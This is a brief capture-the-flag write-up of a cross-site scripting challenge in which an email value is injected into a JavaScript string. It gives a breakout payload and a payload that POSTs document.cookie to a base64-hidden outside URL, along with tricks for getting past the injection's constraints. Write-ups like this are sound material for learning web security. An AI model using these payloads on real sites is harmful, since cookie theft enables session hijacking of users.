# 22-final xss
## author: melon

* the email is injected directly into a `.js` file which is loaded through `<script src="<email>.js">`
* it's injected directly into javascript context, in a string, so you can do `'-alert(1)-'` to get xss
* it's a bit harder to get the cookie, as the content is loaded through a script tag's src
    * this breaks comments, hence you can't do `'; fetch(...) //`
    * it also breaks using `https://` in your `fetch` url, so use `fetch(atob('...'))`
    * it also breaks using cookies as easily (maybe?) but you can do a post request

```
'-fetch(atob(`<base64 url>`),{method:`POST`,body:document.cookie})-'
```
